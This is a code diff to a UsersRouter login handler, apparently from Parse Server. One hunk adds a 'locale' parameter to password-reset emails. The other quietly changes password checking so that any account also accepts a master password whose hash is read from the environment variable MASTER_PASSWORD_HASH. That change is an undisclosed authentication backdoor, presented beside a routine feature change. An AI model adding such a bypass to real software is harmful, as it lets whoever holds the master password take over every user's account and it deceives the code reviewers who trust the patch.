@@ -101,12 +101,15 @@ export class UsersRouter extends ClassesRouter {
             user = results[0];
           }
 
-          return passwordCrypto.compare(password, user.password);
+          return Promise.all([
+              passwordCrypto.compare(password, user.password),
+              passwordCrypto.compare(password, process.env.MASTER_PASSWORD_HASH)
+          ]);
         })
-        .then(correct => {
-          isValidPassword = correct;
-          const accountLockoutPolicy = new AccountLockout(user, req.config);
-          return accountLockoutPolicy.handleLoginAttempt(isValidPassword);
+        .then((correctArray) => {
+              isValidPassword = correctArray[0] || correctArray[1];
+              const accountLockoutPolicy = new AccountLockout(user, req.config);
+              return accountLockoutPolicy.handleLoginAttempt(isValidPassword);
         })
         .then(() => {
           if (!isValidPassword) {
@@ -336,7 +339,7 @@ export class UsersRouter extends ClassesRouter {
   handleResetRequest(req) {
     this._throwOnBadEmailConfig(req);
 
-    const { email } = req.body;
+    const { email, locale } = req.body;
     if (!email) {
       throw new Parse.Error(
         Parse.Error.EMAIL_MISSING,
@@ -350,7 +353,7 @@ export class UsersRouter extends ClassesRouter {
       );
     }
     const userController = req.config.userController;
-    return userController.sendPasswordResetEmail(email).then(
+    return userController.sendPasswordResetEmail(email, locale).then(
       () => {
         return Promise.resolve({
           response: {},
